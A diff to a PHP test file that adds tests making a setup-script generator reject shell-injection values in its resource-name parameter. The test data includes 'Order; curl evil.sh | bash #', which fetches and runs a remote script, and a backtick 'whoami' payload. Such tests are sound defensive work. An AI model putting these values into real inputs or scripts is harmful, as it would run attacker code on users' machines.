@@ -132,3 +132,24 @@ it('emits dark-mode hint only when enabled', function (): void {
     expect($on)->toContain('Dark mode preset enabled');
     expect($off)->not->toContain('Dark mode preset');
 });
+
+it('rejects a firstResource containing shell metacharacters (command injection)', function (): void {
+    // The generated setup script interpolates firstResource straight into a
+    // `php artisan arqel:resource <value>` line. Without validation, a value
+    // like `Order; curl evil.sh | bash #` injects a second shell command that
+    // runs when the user executes the script. A resource name is a PHP class
+    // identifier — reject anything else.
+    expect(fn () => new SetupScriptGenerator(appName: 'app', firstResource: 'Order; curl evil.sh | bash #'))
+        ->toThrow(InvalidArgumentException::class);
+});
+
+it('rejects a firstResource with a backtick/space payload', function (): void {
+    expect(fn () => new SetupScriptGenerator(appName: 'app', firstResource: 'X `whoami`'))
+        ->toThrow(InvalidArgumentException::class);
+});
+
+it('accepts a valid PascalCase resource name', function (): void {
+    $script = (new SetupScriptGenerator(appName: 'app', firstResource: 'BlogPost'))->forBash();
+
+    expect($script)->toContain('php artisan arqel:resource BlogPost');
+});
